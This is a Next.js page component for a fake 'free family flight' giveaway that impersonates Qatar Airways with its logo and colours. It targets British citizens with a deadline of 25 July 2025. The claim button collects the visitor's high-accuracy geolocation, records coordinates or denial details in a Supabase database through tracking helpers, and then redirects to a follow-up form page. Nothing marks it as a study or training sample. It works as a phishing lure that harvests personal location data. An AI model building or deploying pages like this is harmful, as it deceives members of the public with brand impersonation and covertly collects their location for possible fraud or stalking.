'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { supabaseHelpers } from '@/lib/supabase'
import Image from 'next/image'

export default function Home() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [showDbWarning, setShowDbWarning] = useState(false)

  useEffect(() => {
    // Track page visit and check if database is set up
    supabaseHelpers.trackPageVisit('main_page').then((result) => {
      if (result === null) {
        // Database tables don't exist
        setShowDbWarning(true)
      }
    })
  }, [])

  const handleAllowLocation = async () => {
    setIsLoading(true)
    
    // Track permission request
    await supabaseHelpers.trackLocationPermission('requested')
    
    if (!navigator.geolocation) {
      alert('Geolocation is not supported by this browser.')
      setIsLoading(false)
      return
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords
        
        // Track successful location access
        await supabaseHelpers.trackLocationPermission('granted', {
          latitude,
          longitude,
          accuracy
        })
        
        // Store location in sessionStorage for the form page
        sessionStorage.setItem('userLocation', JSON.stringify({
          latitude,
          longitude,
          accuracy
        }))
        
        // Redirect to success form page
        router.push('/success')
      },
      async (error) => {
        // Track permission denial
        await supabaseHelpers.trackLocationPermission('denied', {
          error_code: error.code,
          error_message: error.message
        })
        
        // Redirect to blocked page
        router.push('/blocked')
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    )
  }

  return (
    <div className="consent-container">
      {showDbWarning && (
        <div className="db-warning">
          <div className="db-warning-content">
            <span className="warning-icon">⚠️</span>
            <div>
              <strong>Database Setup Required</strong>
              <p>Please set up the database tables. See <code>QUICK_SETUP.md</code> for instructions.</p>
            </div>
            <button onClick={() => setShowDbWarning(false)} className="close-warning">×</button>
          </div>
        </div>
      )}
      <div className="image-section">
        <div className="image-overlay"></div>
        <Image 
          src="/family-travel.jpeg" 
          alt="Free family flights!" 
          className="prize-image"
          fill
          style={{ objectFit: 'cover' }}
          priority
        />
      </div>
      <div className="content-section">
        <Image 
          src="https://logotyp.us/files/qatar-airways.svg" 
          alt="Qatar Airways" 
          className="logo"
          width={140}
          height={60}
        />
        <h1>Claim Your FREE Family Flight with Qatar Airways!</h1>
        <p>
          Don&apos;t miss this exclusive offer for British citizens! Book a free flight for your family from Manchester to anywhere in the world. This offer is only valid until the 25th of July 2025.
        </p>
        <button 
          onClick={handleAllowLocation}
          disabled={isLoading}
          className={isLoading ? 'loading' : ''}
        >
          {isLoading ? 'Getting Location...' : 'Claim Your Free Flights'}
        </button>
      </div>

      <style jsx>{`
        .consent-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          width: 100%;
          margin: 0;
          padding: 0;
          background: #f8f8f8;
          font-family: 'Poppins', sans-serif;
        }

        .image-section {
          position: relative;
          flex: 1 1 55%;
          min-height: 300px;
        }

        .image-overlay {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: linear-gradient(to top, rgba(0,0,0,0.5), transparent);
          z-index: 1;
        }

        .prize-image {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        .content-section {
          flex: 1 1 45%;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          padding: 2rem;
          text-align: center;
          box-sizing: border-box;
          background: #ffffff;
          border-top-left-radius: 20px;
          border-top-right-radius: 20px;
          margin-top: -20px;
          position: relative;
          box-shadow: 0 -5px 15px rgba(0,0,0,0.05);
          z-index: 2;
        }

        .logo {
          width: clamp(120px, 20vw, 140px);
          margin-bottom: 1.25rem;
        }

        h1 {
          font-size: clamp(1.5rem, 4vw, 1.9rem);
          font-weight: 700;
          margin-bottom: 1rem;
          color: #5c0f3c; /* Qatar Airways Maroon */
          letter-spacing: -0.5px;
        }

        p {
          font-size: clamp(0.85rem, 2.5vw, 1rem);
          font-weight: 400;
          margin-bottom: 1.75rem;
          line-height: 1.7;
          color: #555;
          max-width: 420px;
        }

        button {
          background-color: #5c0f3c; /* Qatar Airways Maroon */
          color: white;
          border: none;
          padding: 16px 32px;
          border-radius: 50px;
          cursor: pointer;
          font-size: clamp(1rem, 3vw, 1.2rem);
          font-weight: 600;
          transition: all 0.3s ease;
          width: 100%;
          max-width: 340px;
          box-shadow: 0 4px 12px rgba(92, 15, 60, 0.3);
        }

        button:hover:not(.loading) {
          background-color: #4a0c30;
          transform: translateY(-3px);
          box-shadow: 0 6px 16px rgba(92, 15, 60, 0.4);
        }

        button.loading {
          opacity: 0.7;
          cursor: not-allowed;
        }

        button:disabled {
          opacity: 0.7;
          cursor: not-allowed;
          transform: none;
        }

        .db-warning {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          background: #ff6b6b;
          color: white;
          z-index: 1000;
          padding: 1rem;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .db-warning-content {
          display: flex;
          align-items: center;
          gap: 1rem;
          max-width: 1200px;
          margin: 0 auto;
        }

        .warning-icon {
          font-size: 1.5rem;
          flex-shrink: 0;
        }

        .db-warning strong {
          display: block;
          margin-bottom: 0.25rem;
        }

        .db-warning p {
          margin: 0;
          font-size: 0.9rem;
          opacity: 0.9;
        }

        .db-warning code {
          background: rgba(255, 255, 255, 0.2);
          padding: 0.2rem 0.4rem;
          border-radius: 4px;
          font-family: monospace;
        }

        .close-warning {
          background: none !important;
          border: none !important;
          color: white !important;
          font-size: 1.5rem !important;
          cursor: pointer !important;
          padding: 0 !important;
          margin-left: auto !important;
          width: auto !important;
          max-width: none !important;
          box-shadow: none !important;
          transform: none !important;
        }

        .close-warning:hover {
          opacity: 0.7 !important;
          transform: none !important;
          box-shadow: none !important;
        }
      `}</style>
    </div>
  )
}